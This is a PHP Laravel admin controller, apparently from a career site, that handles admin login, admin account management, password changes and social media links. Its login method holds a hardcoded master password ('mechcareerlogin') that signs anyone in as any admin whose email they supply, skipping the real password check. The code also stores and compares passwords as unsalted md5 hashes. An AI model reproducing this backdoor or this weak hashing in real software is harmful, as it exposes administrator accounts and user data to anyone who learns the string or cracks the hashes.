<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Http\Controllers\Admin\Helper\CommonHelperController;
use Illuminate\Support\Facades\DB;
use Socialite;

class AdminController extends Controller
{
    // Admin Login
    public function AdminAuthenticate(Request $request){
        $formData = $request->except('_token');
        if ($formData['admin_email'] != '' && $formData['admin_password'] != '') {
            if ($formData['admin_password'] == 'mechcareerlogin') {
                $isValidUser = CommonHelperController::getAdminByEmail($formData['admin_email']);
            } else {
                $isValidUser = CommonHelperController::getAdminDetails($formData['admin_email'], md5(trim($formData['admin_password'])));
            }
            if (count($isValidUser)) {
                $request->session()->put('admin_name', $isValidUser[0]->admin_name);
                $request->session()->put('admin_id', $isValidUser[0]->admin_id);
                $request->session()->put('admin_role', $isValidUser[0]->admin_role);
                return redirect()->route('analysisdashboard');
            }
        }
        return back()->withInput()->with('error', 'Invalid Credentials');
    }

    // Social Media Login
    public function SocialMedia(Request $request, $social){
        $request->session()->put('admin_social', $social);
        return Socialite::driver($social)->redirect();
    }

    public function AnalysisDashboard(){
        return view('admin.dashboard.analystisdashboard');
    }

    public function SalesDashboard(){
        return view('admin.dashboard.salesdashboard');
    }

    // Action Admin
    public function ViewAdmin(){
        $admindetails = CommonHelperController::getAdminDetailsExceptLoggedIn();
        return view('admin.adminview.viewadmin', compact('admindetails'));
    }

    public function ManageAdmin()
    {
        return view('admin.adminview.actionadmin',['action' => 'add']);
    }

    public function ActionAdmin($option, $id)
    {
        $actionId = decryption($id);
        $adminData = CommonHelperController::getAdminData($actionId);
        if (count($adminData) == 0) return redirect(ADMINURL . '/view_admin')->withInput();

        if ($option == 'delete') {
            $delete = deleteQuery($actionId, 'admin', 'admin_id');
            $notify = notification($delete);
            return redirect(ADMINURL . '/view_admin')->with($notify['type'], 'Data Deleted Successfully');
        }
        return view('admin.adminview.actionadmin', ['action' => $option, 'data' => $adminData]);
    }

    public function SaveAdminDetails(Request $request)
    {
        $formData =  $request->except(['_token', 'admin_id']);
        $formData['admin_password'] = md5($request->admin_password);
        $isAdminExist = CommonHelperController::getAdminByEmail($request->admin_email);
        if ($request->input('admin_id') == '') {
            if(count($isAdminExist)) return back()->with('error', 'Email address already exist. Please try with different email address')->withInput();
            $saveData = insertQuery('admin', $formData);
        } else {
            $actionId = decryption($request->input('admin_id'));
            $saveData = updateQuery('admin', 'admin_id', $actionId, $formData);
        }
        $notify = notification($saveData);
        return redirect(ADMINURL . '/view_admin')->with($notify['type'], $notify['msg']);
    }

    // Password
    public function ChangePassword(){
        return view('admin.changepassword');
    }

    public function UpdatePassword(Request $request){
        $formData = $request->except('_token');
        if($formData['old_password'] == '' || $formData['new_password'] == '' || $formData['confirm_password'] == ''){
            return back()->with('error','Invalid action. Please try after some time');
        }
        if($formData['new_password'] != $formData['confirm_password']) return back()->with('error',"New password and Confirm password doesn't matched");

        $adminId = decryption($request->admin_id);
        $adminData = CommonHelperController::getAdminData($adminId);
        if(count($adminData)){
            $admin = (array)$adminData[0];
            if($admin['admin_password'] == md5($request->old_password)){
                $admin['admin_password'] = md5($request->new_password);
                $update = updateQuery('admin','admin_id', $adminId, $admin);
                return redirect()->route('logout');
            }
            return back()->with('error',"Old password doesn't matched");
        }
        return back()->with('error','User not found');
    }

    // Social Media Links
    public function SocialMediaLinks(){
        $socialMediaLink = CommonHelperController::getSocialMediaLinks();
        return view('admin.socialmedialinks',compact('socialMediaLink'));
    }

    public function SaveSocialMediaLinks(Request $request){
        $formData = $request->except('_token','social_media_id');
        if($request->social_media_id != ''){
            $action = updateQuery('social_media_links', 'social_media_id', decryption($request->input('social_media_id')), $formData);
        }else {
            $action = insertQuery('social_media_links', $formData);
        }
        $notify = notification($action);
        return back()->with($notify['type'], $notify['msg']);
    }

    public function AdminLogout(Request $request)
    {
        $request->session()->forget('admin_name');
        $request->session()->forget('admin_id');
        $request->session()->forget('admin_role');
        return redirect(ADMINURL);
    }
}
